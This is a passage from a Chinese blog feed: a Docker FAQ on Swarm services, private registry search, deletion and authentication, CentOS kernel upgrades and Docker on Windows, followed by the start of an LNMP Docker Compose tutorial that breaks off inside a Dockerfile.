service create</code>是两个不同理念的东西。</p><p>一代 Swarm 中，将 Swarm 集群视为一个巨大的 Docker 主机，本质上和单机没有区别，都是直接调度运行容器。因此依旧使用单机的 <code>docker run</code>的方式来启动特定容器。</p><p>二代 Swarm 则改变了这个理念，增加了<code>服务栈(Stack)</code>、<code>服务(Service)</code>、<code>任务(Task)</code> 的概念。在二代 Swarm 中，一组服务可以组成一个整体进行部署，也就是部署服务栈，这相当于是之前的<code>Docker Compose</code> 所完成的目的。但是这次，是真正的针对服务的。</p><p>一个服务并非一个容器，一个服务可以有多个副本任务，每个任务对应一个容器。这个概念在一代 Swarm 和单机环境中是没有的，因此 <code>Docker Compose</code>为了实现服务的概念，用了各种办法去模拟，包括使用 <code>labels</code>，使用网络别名等等，但是本质上，依旧是以容器为单位进行运行，也就是本质上还是一组 <code>docker run</code>。</p><p>正是由于二代 Swarm 中用户操作的单元是服务，所以传统的以容器为中心的 <code>docker run</code> 就不再适用，因此有新的一组针对服务的命令，<code>docker service</code>。</p><h2 id="问：我自建了私有镜像仓库Registry，我如何搜索查询仓库中的镜像？"><a href="#问：我自建了私有镜像仓库Registry，我如何搜索查询仓库中的镜像？" class="headerlink" title="问：我自建了私有镜像仓库Registry，我如何搜索查询仓库中的镜像？"></a>问：我自建了私有镜像仓库Registry，我如何搜索查询仓库中的镜像？</h2><p><strong>答：</strong> 如果只使用开源的 <code>docker registry</code> 自建仓库的话，目前只能用 <code>API</code> 访问其内容。除此以外，官方还有商业版的 <a href="https://docs.docker.com/datacenter/dtr/2.0/" target="_blank" rel="noopener">Docker Trusted Registry</a> 项目，里面有一些增值的内容在里面，提供了类似于 Docker Hub 似得 UI 等，可以搜索过滤。目前 Docker Trusted Registry 属于 Docker Datacenter 的一部分。</p><p>另外，第三方也有一些提供了UI的。比如 <a href="https://github.com/vmware/harbor" target="_blank" rel="noopener">VMWare Harbor</a>。VMWare Harbor是 VMWare 中国基于开源 <code>docker registry</code>进一步开发的项目，有更复杂的上层逻辑。包括用户管理、镜像管理、Registry集群之类的功能。Harbor 是开源的，免费的。</p><p>第三方的 <code>registry</code> 还有 <code>Java</code> 世界里常见的 <code>Nexus</code>，其第三代支持 <code>Docker Registry API</code>。</p><p>或者自己可以编写个脚本去查询：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#import simplejson as json</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">  registry = <span class="string">"http://127.0.0.1:5000"</span> <span class="comment">## 自己镜像仓库地址</span></span><br><span class="line">  res = requests.get(registry + <span class="string">"/v2/"</span>)</span><br><span class="line">  <span class="comment">#assert res.status_code == 200</span></span><br><span class="line"></span><br><span class="line">  res = requests.get(registry + <span class="string">"/v2/_catalog?n=100000"</span>)</span><br><span class="line">  <span class="keyword">assert</span> res.status_code == <span class="number">200</span></span><br><span class="line">  repositories = res.json().get(<span class="string">"repositories"</span>, [])</span><br><span class="line">  <span class="comment">#print("registry reports &#123;&#125; repositories".format(len(repositories)))</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> repository <span class="keyword">in</span> repositories:</span><br><span class="line">    res = requests.get(registry + <span class="string">"/v2/&#123;&#125;/tags/list"</span>.format(repository))</span><br><span class="line">    tags = res.json().get(<span class="string">"tags"</span>, <span class="keyword">None</span>)</span><br><span class="line">    <span class="keyword">if</span> tags:</span><br><span class="line">      <span class="keyword">for</span> tag <span class="keyword">in</span> tags:</span><br><span class="line">        image = format(repository)</span><br><span class="line">        tag = format(tag)</span><br><span class="line">        <span class="keyword">print</span> image+<span class="string">":"</span>+tag</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">  main()</span><br></pre></td></tr></table></figure><h2 id="问：如何删除私有-registry-中的镜像？"><a href="#问：如何删除私有-registry-中的镜像？" class="headerlink" title="问：如何删除私有 registry 中的镜像？"></a>问：如何删除私有 registry 中的镜像？</h2><p><strong>答：</strong> 首先，在默认情况下，<code>docker registry</code> 是不允许删除镜像的，需要在配置<code>config.yml</code>中启用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">delete:</span><br><span class="line">    enabled: <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>然后，使用 <code>API GET /v2/&lt;镜像名&gt;/manifests/&lt;tag&gt;</code> 来取得要删除的 <code>镜像:Tag</code> 所对应的 <code>digest</code> 。</p><p><code>Registry 2.3</code> 以后，必须加入头 <code>Accept: application/vnd.docker.distribution.manifest.v2+json</code> ，否则取到的 <code>digest</code> 是错误的，这是为了防止误删除。</p><p>比如，要删除 <code>myimage:latest</code> 镜像，那么取得 <code>digest</code> 的命令是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ curl --header <span class="string">"Accept: application/vnd.docker.distribution.manifest.v2+json"</span> \</span><br><span class="line">  -I -X HEAD http://192.168.99.100:5000/v2/myimage/manifests/latest \</span><br><span class="line">  | grep Digest</span><br><span class="line">Docker-Content-Digest: sha256:3a07b4e06c73b2e3924008270c7f3c3c6e3f70d4dbb814ad8bff2697123ca33c</span><br></pre></td></tr></table></figure><p>然后调用  <code>API DELETE /v2/&lt;镜像名&gt;/manifests/&lt;digest&gt;</code> 来删除镜像。比如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl  -X DELETE http://192.168.99.100:5000/v2/myimage/manifests/sha256:3a07b4e06c73b2e3924008270c7f3c3c6e3f70d4dbb814ad8bff2697123ca33c</span><br></pre></td></tr></table></figure><p>至此，镜像已从 <code>registry</code> 中标记删除，外界访问 <code>pull</code> 不到了。但是 <code>registry</code> 的本地空间并未释放，需要等待垃圾收集才会释放。而垃圾收集不可以在线进行，必须停止 <code>registry</code>，然后执行。比如，假设 <code>registry</code>是用<code>Compose</code> 运行的，那么下面命令用来垃圾收集：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker-compose stop</span><br><span class="line">docker run -it --name gc --rm --volumes-from registry_registry_1 registry:2 garbage-collect /etc/registry/config.yml</span><br><span class="line">docker-compose start</span><br></pre></td></tr></table></figure><p>其中 <code>registry_registry_1</code> 可以替换为实际的 <code>registry</code> 的容器名，而 <code>/etc/registry/config.yml</code> 则替换为实际的 <code>registry</code> 配置文件路径。</p><p>参考官网文档：</p><ul><li><p><a href="https://docs.docker.com/registry/configuration/#/delete" target="_blank" rel="noopener">https://docs.docker.com/registry/configuration/#/delete</a></p></li><li><p><a href="https://docs.docker.com/registry/spec/api/#/deleting-an-image" target="_blank" rel="noopener">https://docs.docker.com/registry/spec/api/#/deleting-an-image</a></p></li></ul><h2 id="问：自己架的-registry-怎么任何用户都可以取到镜像？这不安全啊？"><a href="#问：自己架的-registry-怎么任何用户都可以取到镜像？这不安全啊？" class="headerlink" title="问：自己架的 registry 怎么任何用户都可以取到镜像？这不安全啊？"></a>问：自己架的 registry 怎么任何用户都可以取到镜像？这不安全啊？</h2><p><strong>答：</strong> 那是因为没有加认证，不加认证的意思就是允许任何人访问的。</p><p>添加认证有两种方式：</p><ul><li>Registry 配置中加入认证： <a href="https://docs.docker.com/registry/configuration/#/auth" target="_blank" rel="noopener">https://docs.docker.com/registry/configuration/#/auth</a></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">auth:</span><br><span class="line">  token:</span><br><span class="line">    realm: token-realm</span><br><span class="line">    service: token-service</span><br><span class="line">    issuer: registry-token-issuer</span><br><span class="line">    rootcertbundle: /root/certs/bundle</span><br><span class="line">  htpasswd:</span><br><span class="line">    realm: basic-realm</span><br><span class="line">    path: /path/to/htpasswd</span><br></pre></td></tr></table></figure><ul><li>前端架设 nginx 进行认证：<a href="https://docs.docker.com/registry/recipes/nginx/" target="_blank" rel="noopener">https://docs.docker.com/registry/recipes/nginx/</a></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">location /v2/ &#123;</span><br><span class="line">    ...</span><br><span class="line">    auth_basic <span class="string">"Registry realm"</span>;</span><br><span class="line">    auth_basic_user_file /etc/nginx/conf.d/nginx.htpasswd;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用VMWare Harbor部署镜像仓库，Harbor 提供了高级的安全特性，诸如用户管理，访问控制和活动审计等。</p><h2 id="问：CentOS-7-默认的内核太老了-3-10，是不是很多-Docker-功能不支持？"><a href="#问：CentOS-7-默认的内核太老了-3-10，是不是很多-Docker-功能不支持？" class="headerlink" title="问：CentOS 7 默认的内核太老了 3.10，是不是很多 Docker 功能不支持？"></a>问：CentOS 7 默认的内核太老了 3.10，是不是很多 Docker 功能不支持？</h2><p><strong>答：</strong> 是的，有一些功能无法支持，比如 <code>overlay2</code> 的存储驱动就无法在<code>CentOS</code> 上使用，但并非所有需要高版本内核的功能都不支持。</p><p>比如 <code>Overlay FS</code> 需要 <code>Linux 3.18</code>，而<code>Overlay network</code> 需要 <code>Linux 3.16</code>。而 <code>CentOS 7</code> 内核为 <code>3.10</code>，确实低于这些版本需求。但实际上，红帽团队会把一些新内核的功能 <code>backport</code> 回老的内核。比如<code>overlay fs</code>等。所以一些功能依旧会支持。因此 <code>CentOS 7</code>的 <code>Docker Engine</code> 同样可以支持 <code>overlay network</code>，以及<code>overlay</code> 存储驱动（不是<code>overlay2</code>）。因此在新的 <code>Docker 1.12</code> 中，<code>CentOS/RHEL 7</code> 才有可能支持 <code>Swarm Mode</code>。</p><p>即使红帽会把一些高版本内核的功能 <code>backport</code> 回 <code>3.10</code>内核中，这种修修补补出来的功能，并不一定稳定。如果观察 <code>Docker Issue</code> 列表，会发现大量的由于 <code>CentOS</code> 老内核导致的问题，特别是在使用了 <code>1.12</code> 内置的 <code>Swarm Mode</code> 集群功能后，存储、网络出现的问题很多。</p><p>所以想要在Centos 系统上更好的使用Docker，建议检查和升级下系统内核：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget http://mirror.rc.usf.edu/compute_lock/elrepo/kernel/el7/x86_64/RPMS/kernel-ml-4.11.1-1.el7.elrepo.x86_64.rpm</span><br><span class="line">yum -y install linux-firmware</span><br><span class="line">rpm -ivh kernel-ml-4.11.1-1.el7.elrepo.x86_64.rpm</span><br><span class="line">grub2-set-default 0</span><br><span class="line">grub2-mkconfig -o /boot/grub2/grub.cfg</span><br><span class="line">package-cleanup --oldkernels --count=1 -y</span><br></pre></td></tr></table></figure><p>然后需要重启下机器以启用新的内核。</p><h2 id="听说-Windows-10、Windows-Server-2016-内置-Docker-了？和-Docker-官网下载的-Docker-for-Windows-有什么区别啊？"><a href="#听说-Windows-10、Windows-Server-2016-内置-Docker-了？和-Docker-官网下载的-Docker-for-Windows-有什么区别啊？" class="headerlink" title="听说 Windows 10、Windows Server 2016 内置 Docker 了？和 Docker 官网下载的 Docker for Windows 有什么区别啊？"></a>听说 Windows 10、Windows Server 2016 内置 Docker 了？和 Docker 官网下载的 Docker for Windows 有什么区别啊？</h2><p>二者完全不同。</p><p><code>Windows 10</code> 或者 <code>Windows Server 2016</code> 自带的 Docker，被称为 <code>Docker on Windows</code>，其运行于 <code>Windows NT</code>内核至上，以 Docker 类似的方式提供 Windows 容器服务，因此只可以运行 Windows 程序。</p><p>而 Docker 官网下载的，被称为 <code>Docker for Windows</code>。这是我们常说的 Docker，它是运行于 <code>Linux</code> 内核上的 Docker。在 Windows 上运行时实际上是在<code>Hyper-V</code> 上的一个 <code>Alpine Linux</code> 虚拟机上运行的 Docker。它只可以运行 <code>Linux</code> 程序。</p><p><code>Docker on Windows</code> 极为臃肿，最小镜像也近 <code>GB</code>，启动时间并不快；而 <code>Docker for Windows</code> 则是正常的 Docker，最小镜像也就几十 <code>KB</code>，一般的镜像都在几百兆以内，而且启动时间基本是毫秒级。</p><hr><p><strong>未完待续</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;问：Docker-和-传统的虚拟机有什么差别？&quot;&gt;&lt;a href=&quot;#问：Docker-和-传统的虚拟机有什么差别？&quot; class=&quot;headerlink&quot; title=&quot;问：Docker 和 传统的虚拟机有什么差别？&quot;&gt;&lt;/a&gt;问：Docker 和 传统的虚拟机有什么差别？&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;答：&lt;/strong&gt; 我们知道inux系统将自身划分为两部分，一部分为核心软件，也称作内核空间(&lt;code&gt;kernel&lt;/code&gt;)，另一部分为普通应用程序，这部分称为用户空间(&lt;code&gt;userland&lt;/code&gt;)。&lt;br&gt;容器内的进程是直接运行于宿主内核的，这点和宿主进程一致，只是容器的 &lt;code&gt;userland&lt;/code&gt; 不同，容器的 &lt;code&gt;userland&lt;/code&gt; 由容器镜像提供，也就是说镜像提供了 &lt;code&gt;rootfs&lt;/code&gt;。&lt;br&gt;假设宿主是 &lt;code&gt;Ubuntu&lt;/code&gt;，容器是 &lt;code&gt;CentOS&lt;/code&gt;。&lt;code&gt;CentOS&lt;/code&gt; 容器中的进程会直接向 &lt;code&gt;Ubuntu&lt;/code&gt; 宿主内核发送 &lt;code&gt;syscall&lt;/code&gt;，而不会直接或间接的使用任何 &lt;code&gt;Ubuntu&lt;/code&gt; 的 &lt;code&gt;userland&lt;/code&gt; 的库。&lt;br&gt;这点和虚拟机有本质的不同，虚拟机是虚拟环境，在现有系统上虚拟一套物理设备，然后在虚拟环境内运行一个虚拟环境的操作系统内核，在内核之上再跑完整系统，并在里面调用进程。&lt;br&gt;还以上面的例子去考虑，虚拟机中，&lt;code&gt;CentOS&lt;/code&gt; 的进程发送 &lt;code&gt;syscall&lt;/code&gt; 内核调用，该请求会被虚拟机内的 &lt;code&gt;CentOS&lt;/code&gt; 的内核接到，然后 &lt;code&gt;CentOS&lt;/code&gt; 内核访问虚拟硬件时，由虚拟机的服务软件截获，并使用宿主系统，也就是 &lt;code&gt;Ubuntu&lt;/code&gt; 的内核及 &lt;code&gt;userland&lt;/code&gt; 的库去执行。&lt;br&gt;而且，Linux 和 Windows 在这点上非常不同。Linux 的进程是直接发 &lt;code&gt;syscall&lt;/code&gt; 的，而 Windows 则把 &lt;code&gt;syscall&lt;/code&gt; 隐藏于一层层的 &lt;code&gt;DLL&lt;/code&gt; 服务之后，因此 Windows 的任何一个进程如果要执行，不仅仅需要 Windows 内核，还需要一群服务来支撑，所以如果 Windows 要实现类似的机制，容器内将不会像 Linux 这样轻量级，而是非常臃肿。看一下微软移植的 Docker 就非常清楚了。&lt;br&gt;所以不要把 Docker 和虚拟机弄混，Docker 容器只是一个进程而已，只不过利用镜像提供的 &lt;code&gt;rootfs&lt;/code&gt; 提供了调用所需的 &lt;code&gt;userland&lt;/code&gt; 库支持，使得进程可以在受控环境下运行而已，它并没有虚拟出一个机器出来。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Linux 容器不是模拟一个完整的操作系统，而是对进程进行隔离。&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&quot;问：如何安装-Docker？&quot;&gt;&lt;a href=&quot;#问：如何安装-Docker？&quot; class=&quot;headerlink&quot; title=&quot;问：如何安装 Docker？&quot;&gt;&lt;/a&gt;问：如何安装 Docker？&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;答：&lt;/strong&gt; 很多人问到 &lt;code&gt;docker&lt;/code&gt;, &lt;code&gt;docker.io&lt;/code&gt;, &lt;code&gt;docker-engine&lt;/code&gt; 甚至 &lt;code&gt;lxc-docker&lt;/code&gt; 都有什么区别？&lt;br&gt;其中，RHEL/CentOS 软件源中的 Docker 包名为 &lt;code&gt;docker&lt;/code&gt;；Ubuntu 软件源中的 Docker 包名为 &lt;code&gt;docker.io&lt;/code&gt;；而很古老的 Docker 源中 Docker 也曾叫做 &lt;code&gt;lxc-docker&lt;/code&gt;。这些都是非常老旧的 Docker 版本，并且基本不会更新到最新的版本，而对于使用 Docker 而言，使用最新版本非常重要。另外，17.04 以后，包名从 &lt;code&gt;docker-engine&lt;/code&gt; 改为 &lt;code&gt;docker-ce&lt;/code&gt;，因此从现在开始安装，应该都使用 &lt;code&gt;docker-ce&lt;/code&gt;这个包。&lt;br&gt;正确的安装方法有两种：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;一种是参考官方安装文档去配置 apt 或者 yum 的源；&lt;/li&gt;
&lt;li&gt;另一种则是使用官方提供的安装脚本快速安装。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;官方文档对配置源的方法已经有很详细的讲解:&lt;a href=&quot;https://docs.docker-cn.com/engine/installation/linux/docker-ce/centos/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;官方文档地址&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="系统运维" scheme="https://linux7788.com/categories/%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/"/>
    
      <category term="Docker" scheme="https://linux7788.com/categories/%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/Docker/"/>
    
    
      <category term="Docker" scheme="https://linux7788.com/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>Docker 多容器间协作互连范例</title>
    <link href="https://linux7788.com/docker/Docker_lnmp/"/>
    <id>https://linux7788.com/docker/Docker_lnmp/</id>
    <published>2018-04-25T02:32:25.000Z</published>
    <updated>2018-05-18T15:32:58.942Z</updated>
    
    <content type="html"><![CDATA[<h1 id="LNMP-Docker-多容器间协作互连"><a href="#LNMP-Docker-多容器间协作互连" class="headerlink" title="LNMP - Docker 多容器间协作互连"></a>LNMP - Docker 多容器间协作互连</h1><h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><p>这是一个 Docker 多容器间协作互连的例子。使用的是最常见的 LNMP 的技术栈，既 <code>Nginx</code> + <code>PHP</code> + <code>MySQL</code>。</p><p>在这个例子中，我使用的是 Docker Compose，这样比较简洁，如果使用 <code>docker</code> 命令也可以做到同样的效果，当然，过程要相对繁琐一些。</p><h2 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h2><p>在 <code>docker-compose.yml</code> 文件中，定义了3个<strong>服务</strong>，分别是 <code>nginx</code>, <code>php</code> 和 <code>mysql</code>。</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">services:</span></span><br><span class="line"><span class="attr">    nginx:</span></span><br><span class="line"><span class="attr">        image:</span> <span class="string">"$&#123;DOCKER_USER&#125;/lnmp-nginx:v1.2"</span></span><br><span class="line"><span class="attr">        build:</span></span><br><span class="line"><span class="attr">            context:</span> <span class="string">.</span></span><br><span class="line"><span class="attr">            dockerfile:</span> <span class="string">Dockerfile.nginx</span></span><br><span class="line">        <span class="string">...</span></span><br><span class="line"><span class="attr">    php:</span></span><br><span class="line"><span class="attr">        image:</span> <span class="string">"$&#123;DOCKER_USER&#125;/lnmp-php:v1.2"</span></span><br><span class="line"><span class="attr">        build:</span></span><br><span class="line"><span class="attr">            context:</span> <span class="string">.</span></span><br><span class="line"><span class="attr">            dockerfile:</span> <span class="string">Dockerfile.php</span></span><br><span class="line">        <span class="string">...</span></span><br><span class="line"><span class="attr">    mysql:</span></span><br><span class="line"><span class="attr">        image:</span> <span class="attr">mysql:5.7</span></span><br><span class="line">        <span class="string">...</span></span><br></pre></td></tr></table></figure><p>其中 <code>mysql</code> 服务中的 <code>image: mysql:5.7</code> 是表明使用的是 <code>mysql:5.7</code> 这个镜像。而 <code>nginx</code> 和 <code>php</code> 服务中的 <code>image</code> 含义更为复杂。一方面是说，要使用其中名字的镜像，另一方面，如果这个镜像不存在，则利用其下方指定的 <code>build</code> 指令进行构建。在单机环境，这里的 <code>image</code> 并非必须，只保留 <code>build</code> 就可以。但是在 Swarm 环境中，需要集群中全体主机使用同一个镜像，每个机器自己构建就不合适了，指定了 <code>image</code> 后，就可以在单机 <code>build</code> 并 <code>push</code> 到 registry，然后在集群中执行 <code>up</code> 的时候，才可以自动从 registry 下载所需镜像。<br><a id="more"></a><br>这里的镜像名看起来也有些不同：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">image: <span class="string">"<span class="variable">$&#123;DOCKER_USER&#125;</span>/lnmp-nginx:v1.2"</span></span><br></pre></td></tr></table></figure><p>其中的 <code>${DOCKER_USER}</code> 这种用法是环境变量替换，当存在环境变量 <code>DOCKER_USER</code> 时，将会用其值替换 <code>${DOCKER_USER}</code>。而环境变量从哪里来呢？除了在 Shell 中 <code>export</code> 对应的环境变量外，Docker Compose 还支持一个默认的环境变量文件，既 <code>.env</code> 文件。你可以在项目中看到，<code>docker-compose.yml</code> 的同级目录下，存在一个 <code>.env</code> 文件，里面定义了环境变量。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DOCKER_USER=twang2218</span><br></pre></td></tr></table></figure><p>每次执行 <code>docker-compose</code> 命令的时候，这个 <code>.env</code> 文件就会自动被加载，所以是一个用来定制 compose 文件非常方便的地方。这里我只定义了一个环境变量 <code>DOCKER_USER</code>，当然，可以继续一行一个定义更多的环境变量。</p><p>初次之外，还可以明确指定环境变量文件。具体的配置请查看 <a href="https://docs.docker.com/compose/compose-file/#envfile" target="_blank" rel="noopener"><code>docker-compose</code> 官方文档</a>。</p><h2 id="镜像"><a href="#镜像" class="headerlink" title="镜像"></a>镜像</h2><h3 id="mysql-服务镜像"><a href="#mysql-服务镜像" class="headerlink" title="mysql 服务镜像"></a>mysql 服务镜像</h3><p><code>mysql</code> 服务均直接使用的是 Docker 官方镜像。使用官方镜像并非意味着无法定制，Docker 官方提供的镜像，一般都具有一定的定制能力。</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">mysql:</span></span><br><span class="line"><span class="attr">    image:</span> <span class="attr">mysql:5.7</span></span><br><span class="line">    <span class="string">...</span></span><br><span class="line"><span class="attr">    environment:</span></span><br><span class="line"><span class="attr">        TZ:</span> <span class="string">'Asia/Shanghai'</span></span><br><span class="line"><span class="attr">        MYSQL_ROOT_PASSWORD:</span> <span class="string">Passw0rd</span></span><br><span class="line"><span class="attr">    command:</span> <span class="string">['mysqld',</span> <span class="string">'--character-set-server=utf8'</span><span class="string">]</span></span><br><span class="line">    <span class="string">...</span></span><br></pre></td></tr></table></figure><p>在这个例子中，<code>mysql</code> 服务就通过环境变量 <code>MYSQL_ROOT_PASSWORD</code>，设定了 MySQL 数据库初始密码为 <code>Passw0rd</code>，并且通过 <code>TZ</code> 环境变量指定了国内时区。</p><p>并且，我重新指定了启动容器的命令，在 <code>command</code> 中，添加了额外的参数。<code>--character-set-server=utf8</code>，指定了默认字符集。</p><h3 id="nginx-服务镜像"><a href="#nginx-服务镜像" class="headerlink" title="nginx 服务镜像"></a>nginx 服务镜像</h3><p><code>nginx</code> 官方镜像基本满足需求，但是我们需要添加默认网站的配置文件、以及网站页面目录。</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> nginx:<span class="number">1.11</span></span><br><span class="line"><span class="keyword">ENV</span> TZ=Asia/Shanghai</span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> ./nginx.conf /etc/nginx/conf.d/default.conf</span></span><br><span class="line"><span class="bash">COPY ./site /usr/share/nginx/html</span></span><br></pre></td></tr></table></figure><p>镜像定制很简单，就是指定时区后，将配置文件、网站页面目录复制到指定位置。</p><h3 id="php-服务镜像"><a href="#php-服务镜像" class="headerlink" title="php 服务镜像"></a>php 服务镜像</h3><p><code>php</code> 服务较为特殊，由于官方 <code>php</code> 镜像未提供连接 <code>mysql</code> 所需的插件，所以 <code>php</code> 服务无法直接使用官方镜像。在这里，正好用其作为例子，演示如何基于官方镜像，安装插件，定制自己所需的镜像。</p><p>对应的<code>Dockerfile</code>：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> php:<span class="number">7</span>-fpm</span><br><span class="line"></span><br><span class="line"><span class="keyword">ENV</span> TZ=Asia/Shanghai</span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> sources.list /etc/apt/sources.list</span></span><br><span class="line"><span class="bash"></span></span><br><span class="line"><span class="bash">RUN <span class="built_in">set</span> -xe \</span></span><br><span class="line"><span class="bash">    &amp;&amp; <span class="built_in">echo</span> <span class="string">"构建依赖"</span> \</span></span><br><span class="line"><span class="bash">    &amp;&amp; buildDeps=<span class="string">" \</span></span></span><br><span class="line"><span class="bash">        build-essential \</span></span><br><span class="line"><span class="bash">        php5-dev \</span></span><br><span class="line"><span class="bash">        libfreetype6-dev \</span></span><br><span class="line"><span class="bash">        libjpeg62-turbo-dev \</span></span><br><span class="line"><span class="bash">        libmcrypt-dev \</span></span><br><span class="line"><span class="bash">        libpng12-dev \</span></span><br><span class="line"><span class="bash">    <span class="string">" \</span></span></span><br><span class="line"><span class="bash">    &amp;&amp; <span class="built_in">echo</span> <span class="string">"运行依赖"</span> \</span></span><br><span class="line"><span class="bash">    &amp;&amp; runtimeDeps=<span class="string">" \</span></span></span><br><span class="line"><span class="bash">        libfreetype6 \</span></span><br><span class="line"><span class="bash">        libjpeg62-turbo \</span></span><br><span class="line"><span class="bash">        libmcrypt4 \</span></span><br><span class="line"><span class="bash">        libpng12-0 \</span></span><br><span class="line"><span class="bash">    <span class="string">" \</span></span></span><br><span class="line"><span class="bash">    &amp;&amp; <span class="built_in">echo</span> <span class="string">"安装 php 以及编译构建组件所需包"</span> \</span></span><br><span class="line"><span class="bash">    &amp;&amp; apt-get update \</span></span><br><span class="line"><span class="bash">    &amp;&amp; apt-get install -y <span class="variable">$&#123;runtimeDeps&#125;</span> <span class="variable">$&#123;buildDeps&#125;</span> --no-install-recommends \</span></span><br><span class="line"><span class="bash">    &amp;&amp; <span class="built_in">echo</span> <span class="string">"编译安装 php 组件"</span> \</span></span><br><span class="line"><span class="bash">    &amp;&amp; docker-php-ext-install iconv mcrypt mysqli pdo pdo_mysql zip \</span></span><br><span class="line"><span class="bash">    &amp;&amp; docker-php-ext-configure gd \</span></span><br><span class="line"><span class="bash">        --with-freetype-dir=/usr/include/ \</span></span><br><span class="line"><span class="bash">        --with-jpeg-dir=/usr/include/ \</span></span><br><span class="line"><span class="bash">    &amp;&amp; docker-php-ext-install gd \</span></span><br><span class="line"><span class="bash">    &amp;&amp; <span class="built_in">echo</span> <span class="string">"清理"</span> 